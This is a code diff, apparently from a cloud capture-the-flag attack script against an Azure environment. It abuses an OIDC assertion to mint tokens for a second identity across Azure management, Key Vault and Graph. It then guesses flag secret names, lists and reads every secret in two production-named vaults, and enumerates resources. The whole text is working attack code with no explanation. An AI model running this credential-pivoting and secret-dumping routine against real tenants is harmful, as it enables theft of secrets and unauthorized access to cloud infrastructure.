@@ -56,25 +56,31 @@ def q(u, tok, m="GET"):
         h["Content-Length"] = "0"
     return ex(u, data=b"" if m == "POST" else None, headers=h, method=m)
 
-FLAG = "/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/secrets/flag" % SUB
-VAULTRES = "/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz" % SUB
-for scope_name, scope in [("flag", FLAG), ("vault", VAULTRES), ("rg", "/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea" % SUB)]:
-    s, b = q("https://management.azure.com%s/providers/Microsoft.Authorization/roleAssignments?$filter=atScope()&api-version=2022-04-01" % scope, ARM)
-    try:
-        for ra in json.loads(b).get("value", []):
-            p = ra["properties"]
-            print("RA", scope_name, p["principalId"], p["roleDefinitionId"].split("/")[-1], p["principalType"])
-    except Exception:
-        print("RA_ERR", scope_name, s, b[:300])
+LA = "891fb158-e02c-4428-a885-53b811f369c0"
+LA_ARM = aad(LA, "https://management.azure.com/.default", assertion=oidc)
+LA_VAULT = aad(LA, "https://vault.azure.net/.default", assertion=oidc)
+LA_GRAPH = aad(LA, "https://graph.microsoft.com/.default", assertion=oidc)
+print("LA_TOKENS arm=%d vault=%d graph=%d" % (len(LA_ARM), len(LA_VAULT), len(LA_GRAPH)))
 
-s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/resources?api-version=2021-04-01" % SUB, ARM)
+for sec in ("flag", "FLAG", "flag.txt", "ctf", "secret", "admin-flag"):
+    s, b = ex("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/%s?api-version=7.4" % sec,
+              headers={"Authorization": "Bearer " + LA_VAULT})
+    print("SEC_FLAG", sec, s, b[:600])
+
+for vault in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
+    s, b = ex("https://%s.vault.azure.net/secrets?api-version=7.4" % vault,
+              headers={"Authorization": "Bearer " + LA_VAULT})
+    print("VAULT_LIST", vault, s, b[:2000])
+    if s == 200:
+        for it in json.loads(b).get("value", []):
+            name = it["id"].rsplit("/", 1)[-1]
+            s2, b2 = ex(it["id"] + "?api-version=7.4", headers={"Authorization": "Bearer " + LA_VAULT})
+            print("SECRET_VAL", vault, name, s2, b2[:800])
+
+s, b = q("https://management.azure.com/subscriptions/%s/resourceGroups/rg-tbl-platform-prod-sea/resources?api-version=2021-04-01" % SUB, LA_ARM)
 try:
     for r in json.loads(b).get("value", []):
-        print("RES", r["type"], r["name"])
+        print("LA_RES", r["type"], r["name"])
 except Exception:
-    print("RES_ERR", s, b[:500])
-
-s, b = q("https://management.azure.com%s?api-version=2023-07-01" % VAULTRES, ARM)
-print("VAULT_PROPS", s, b[:2000])
+    print("LA_RES_ERR", s, b[:300])
 print("===Q_END===")
-PY
